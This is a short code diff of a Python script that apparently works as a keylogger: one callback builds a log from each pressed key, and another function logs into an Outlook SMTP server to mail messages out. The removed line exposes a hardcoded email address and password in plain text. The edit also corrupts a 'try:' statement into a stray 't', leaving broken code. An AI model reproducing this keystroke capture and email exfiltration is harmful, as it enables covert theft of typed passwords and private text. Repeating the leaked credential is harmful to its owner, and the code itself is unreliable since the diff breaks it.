@@ -10,7 +10,7 @@ def Send_mail(alici,gonderen,message):
     mail = smtplib.SMTP("smtp.outlook.office365.com",587)
     mail.ehlo()
     mail.starttls()
-    mail.login("ergintren13@outlook.com","Ergin56.")
+    mail.login("","")
     
     mail.sendmail(alici,gonderen,message)
 
@@ -18,7 +18,7 @@ def Send_mail(alici,gonderen,message):
 
 def calback_func(key):
     global log
-    try:
+    t
         log = log + str(key.char)
         print(log)
     except AttributeError:
